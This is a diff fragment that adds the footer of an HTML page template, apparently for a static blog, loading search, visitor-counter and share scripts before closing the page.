+        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.8.0/dist/instantsearch.min.js" defer></script>
+        <script src="/scripts/search.js" defer></script>
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
